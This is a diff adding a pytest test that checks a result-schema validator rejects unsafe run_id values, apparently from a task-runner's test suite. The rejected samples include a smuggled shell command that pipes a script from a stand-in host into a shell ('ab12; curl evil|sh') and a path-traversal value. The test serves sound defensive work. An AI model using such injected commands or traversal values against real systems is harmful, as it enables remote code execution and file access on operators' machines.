@@ -84,6 +84,26 @@ def test_result_schema_accepts_run_id() -> None:
     )
 
 
+def test_result_schema_rejects_a_run_id_that_is_not_a_plain_handle() -> None:
+    # security/f-003: the runner publishes `lithos-loom develop deliver
+    # <run_id>` to the operator as a command to PASTE — on the gate, the
+    # [NeedsHuman] finding, a desktop toast and a GitHub comment — and
+    # `resolve_run_dir` joins the same value onto the work dir. result.json is
+    # a subprocess contract from an operator-configured route command, not
+    # in-process state, so the shape is pinned here as `commits` already is.
+    for bad in ("ab12; curl evil|sh", "../../etc", "r 1", "x" * 65, ""):
+        with pytest.raises(PluginContractError):
+            validate_result_schema(
+                {
+                    "schema_version": 1,
+                    "task_id": "t1",
+                    "status": "succeeded",
+                    "exit_code": 0,
+                    "run_id": bad,
+                }
+            )
+
+
 def test_result_schema_accepts_escalation_block() -> None:
     # b91177d2: a failed run may describe why it stopped in the shape the
     # runner's needs-human gate is built from.
